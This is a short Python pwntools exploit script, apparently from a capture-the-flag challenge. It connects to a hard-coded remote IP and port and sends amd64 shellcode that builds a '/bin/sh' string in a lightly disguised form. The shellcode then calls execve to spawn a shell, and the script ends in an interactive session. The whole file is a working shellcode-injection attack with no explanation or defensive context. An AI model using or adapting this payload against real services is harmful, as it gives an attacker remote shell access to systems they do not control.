#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.13"
port = 8888
host = "52.69.40.204"
port = 8361
context.arch = "amd64"
sc = asm("""
    inc ebx
    mov r15,0x68732f6e69622e
    add rbx,r15
    push   rbx
    push   rsp
    pop    rdi
    mov    al,0x3b
    syscall
""")
r = remote(host,port)
r.recvuntil(":")
r.sendline(sc)

r.interactive()
